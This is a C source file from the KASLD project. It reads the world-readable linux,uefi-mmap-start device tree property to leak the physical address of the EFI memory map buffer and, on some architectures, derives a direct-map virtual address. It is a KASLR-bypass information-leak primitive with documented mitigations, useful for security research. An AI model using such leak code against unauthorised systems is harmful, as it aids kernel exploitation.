// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Read the physical address of the EFI memory map buffer from the device
// tree sysfs chosen node. On UEFI-booted device tree platforms (ARM64,
// RISC-V, ARM32, PowerPC), the EFI stub records the physical address of
// the EFI memory map buffer into the FDT chosen node before handing off
// to the kernel:
//
//   /sys/firmware/devicetree/base/chosen/linux,uefi-mmap-start
//
// This 8-byte big-endian property contains the physical address of the
// EFI memory map buffer — a DRAM allocation made by the EFI stub via
// EFI_BOOT_SERVICES.GetMemoryMap(). The buffer is in DRAM (not MMIO),
// so the address serves as a physical DRAM witness for phys_base bounding.
//
// This is distinct from the EFI runtime memory map (sysfs_efi_runtime_map.c,
// which reads /sys/firmware/efi/runtime-map/) — that sysfs reflects only
// entries with EFI_MEMORY_RUNTIME set, while this property holds the full
// pre-ExitBootServices() memory map buffer address.
//
// All device tree sysfs files are world-readable (mode 0444, set by
// drivers/of/kobj.c). No dmesg_restrict or sysctl gate applies.
//
// Leak primitive:
//   Data leaked:      physical address of EFI memory map buffer (DRAM)
//   Kernel subsystem: drivers/firmware/efi/fdtparams.c —
//                     efi_set_params_fdt() writes linux,uefi-mmap-start
//   Data structure:   FDT chosen node (linux,uefi-mmap-start, u64 BE)
//   Address type:     physical (DRAM)
//   Method:           parsed (binary sysfs property)
//   Status:           unfixed (information exposure by design)
//   Access check:     none (world-readable sysfs attribute, 0444)
//   Source:
//   https://elixir.bootlin.com/linux/v6.12/source/drivers/firmware/efi/fdtparams.c
//
// Mitigations:
//   CONFIG_OF=n removes device tree sysfs. CONFIG_EFI=n prevents the
//   property from being written to the FDT. Non-EFI boots (U-Boot direct
//   kernel entry without UEFI) will not have the property. The property
//   is world-readable (0444); no runtime sysctl can restrict access.
//   On decoupled architectures (ARM64, RISC-V 64), physical addresses
//   cannot derive the virtual text base.
//
// Requires:
// - CONFIG_OF (device tree support)
// - CONFIG_EFI (UEFI firmware support)
// - UEFI-booted device tree platform (ARM64, ARM32, RISC-V, PowerPC)
//
// References:
// https://elixir.bootlin.com/linux/v6.12/source/drivers/firmware/efi/fdtparams.c
// https://elixir.bootlin.com/linux/v6.12/source/drivers/of/kobj.c#L65
// ---
// <bcoles@gmail.com>

#include "include/kasld.h"
#include "include/kasld_internal.h"
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads the physical address of the EFI memory map buffer from the "
    "device tree sysfs chosen node (/sys/firmware/devicetree/base/chosen/"
    "linux,uefi-mmap-start). This world-readable 8-byte big-endian property "
    "contains the physical DRAM address where the EFI stub allocated the "
    "memory map buffer before ExitBootServices(). Only present on "
    "UEFI-booted device tree platforms (ARM64, RISC-V, ARM32, PowerPC).");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "addr:physical\n"
           "config:CONFIG_OF\n"
           "config:CONFIG_EFI\n");

/* Read raw binary content from a sysfs file. Returns bytes read, or -1. */
static int read_binary(const char *path, unsigned char *buf, size_t len) {
  FILE *f = fopen(path, "rb");
  if (!f)
    return -1;
  int n = (int)fread(buf, 1, len, f);
  fclose(f);
  return n;
}

/* Read a big-endian 32-bit cell from raw bytes. */
static uint32_t read_be32(const unsigned char *p) {
  return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
         ((uint32_t)p[2] << 8) | (uint32_t)p[3];
}

/* Read a big-endian 64-bit value from raw bytes. */
static uint64_t read_be64(const unsigned char *p) {
  uint64_t hi = read_be32(p);
  uint64_t lo = read_be32(p + 4);
  return (hi << 32) | lo;
}

int main(void) {
  const char *bases[] = {"/sys/firmware/devicetree/base/chosen",
                         "/proc/device-tree/chosen", NULL};
  const char *chosen = NULL;
  char path[512];
  unsigned char buf[8];
  int n;

  /* Probe: look for the property in either DT sysfs location */
  for (int i = 0; bases[i]; i++) {
    snprintf(path, sizeof(path), "%s/linux,uefi-mmap-start", bases[i]);
    FILE *f = fopen(path, "rb");
    if (f) {
      fclose(f);
      chosen = bases[i];
      break;
    }
  }

  if (!chosen) {
    printf("[-] device tree chosen node not found or no linux,uefi-mmap-start "
           "property\n");
    return KASLD_EXIT_UNAVAILABLE;
  }

  printf("[.] trying %s/linux,uefi-mmap-start ...\n", chosen);

  /* Read linux,uefi-mmap-start — always 8 bytes (u64 BE) */
  snprintf(path, sizeof(path), "%s/linux,uefi-mmap-start", chosen);
  n = read_binary(path, buf, sizeof(buf));
  if (n != 8) {
    fprintf(stderr, "[-] failed to read %s (got %d bytes, expected 8)\n", path,
            n);
    return 0;
  }

  uint64_t mmap_phys = read_be64(buf);
  if (!mmap_phys) {
    fprintf(stderr, "[-] linux,uefi-mmap-start is zero\n");
    return 0;
  }

  /* Optionally read size for display context */
  uint32_t mmap_size = 0;
  snprintf(path, sizeof(path), "%s/linux,uefi-mmap-size", chosen);
  n = read_binary(path, buf, 4);
  if (n == 4)
    mmap_size = read_be32(buf);

  printf("EFI memmap physical address: 0x%016llx\n",
         (unsigned long long)mmap_phys);
  if (mmap_size)
    printf("EFI memmap size: %u bytes\n", mmap_size);

  kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, (unsigned long)mmap_phys,
               KASLD_REGION_EFI_MEMMAP, NULL);

#if !PHYS_VIRT_DECOUPLED
  unsigned long virt = phys_to_virt((unsigned long)mmap_phys);
  printf("possible direct-map virtual address: 0x%016lx\n", virt);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
               KASLD_REGION_EFI_MEMMAP, NULL);
#else
  printf("note: phys and virt KASLR are decoupled on this arch; "
         "cannot derive directmap virtual address from physical leak\n");
#endif

  return 0;
}
